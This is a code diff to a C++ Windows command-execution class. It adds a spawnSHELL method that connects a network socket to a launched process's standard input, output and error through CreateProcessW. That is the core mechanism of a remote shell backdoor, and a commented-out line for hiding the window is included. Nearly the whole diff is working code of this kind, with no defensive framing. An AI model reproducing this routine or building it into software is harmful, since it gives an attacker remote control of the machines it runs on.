@@ -6,6 +6,7 @@
 #include <iostream> 
 #include <windows.h>
 #include <string>
+#include <winsock2.h> 
 
 
 using namespace std;
@@ -264,9 +265,53 @@ string Exec::executeCommand(string &command)
     //Finally return result_of_command
     return result_of_command; 
 }
+void Exec::spawnSHELL(int sock, wchar_t *prog)
+{
+    cout << "IN METHOD" << endl;
+
+    STARTUPINFOW siStartInfo;
+    PROCESS_INFORMATION piProcInfo;
+    
+    ZeroMemory(&siStartInfo, sizeof(siStartInfo)); //Remplit un bloc de mémoire avec des zéros.
+    ZeroMemory(&piProcInfo, sizeof(piProcInfo));
+
+    siStartInfo.cb = sizeof(siStartInfo);
+
+    siStartInfo.dwFlags = STARTF_USESTDHANDLES; //| STARTF_USESHOWWINDOW) ; //for hStdInput, hStdOutput, hStdError
+
+    cout << "GO SOCK" << endl;
+    siStartInfo.hStdInput = (HANDLE)sock;
+    siStartInfo.hStdOutput = (HANDLE)sock;
+    siStartInfo.hStdError = (HANDLE)sock;
+   // siStartInfo.wShowWindow = SW_HIDE;
+
+    //GetStartupInfoA(&siStartInfo);
+    
+    //wchar_t *cmd;
+    //wcscpy(cmd, prog);
+   
+    cout <<"GO" << endl;
+    CreateProcessW(NULL,  //command line 
+        prog,     // argv of cmd
+        NULL,          // process security attributes 
+        NULL,          // primary thread security attributes 
+        TRUE,          // handles are inherited 
+        0,             // creation flags 
+        NULL,          // use parent's environment 
+        NULL,          // use parent's current directory 
+        &siStartInfo,  // STARTUPINFO pointer 
+        &piProcInfo);  // receives PROCESS_INFORMATION
+    cout << "Wait.." << endl;
+    cout << GetLastError() << endl;
+    WaitForSingleObject(piProcInfo.hProcess, INFINITE);
+    CloseHandle(piProcInfo.hProcess);
+    CloseHandle(piProcInfo.hThread);
+    cout << "Close all Handle" << endl;
+}
 
 Exec::~Exec()
 {
+
     CloseHandle(a_hChildStd_OUT_Rd);
     CloseHandle(a_hChildStd_ERR_Rd);
 }
